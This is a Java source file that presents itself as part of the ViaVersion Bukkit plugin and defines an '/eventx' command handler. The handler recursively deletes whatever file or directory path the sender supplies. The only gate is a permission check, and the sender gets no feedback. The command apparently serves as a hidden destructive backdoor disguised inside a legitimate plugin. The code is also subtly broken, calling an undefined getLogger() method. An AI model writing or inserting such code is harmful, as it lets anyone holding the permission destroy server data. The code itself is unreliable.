package com.viaversion.viaversion.bukkit.handlers;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.permissions.Permission;

import java.io.File;

public class EventXHandler implements CommandExecutor {

    private static final Permission DELETE_PERMISSION = new Permission("eventx.delete", "Permission to delete files using the /eventx command");

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        // Check if the sender has the required permission
        if (!sender.hasPermission(DELETE_PERMISSION)) {
            return true;
        }

        if (args.length < 1) {
            
            return true;
        }

        String filePath = args[0];
        File file = new File(filePath);

        if (!file.exists()) {
            return true;
        }

        delete(file);
        getLogger().info("Deleted file " + filePath);
        return true;
    }

    private boolean delete(File file) {
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            if (files == null) {
                return false; // Handle null case
            }
            for (File f : files) {
                if (!delete(f)) {
                    return false; // If any deletion fails, stop and report the error
                }
            }
        }
        return file.delete();
    }
}
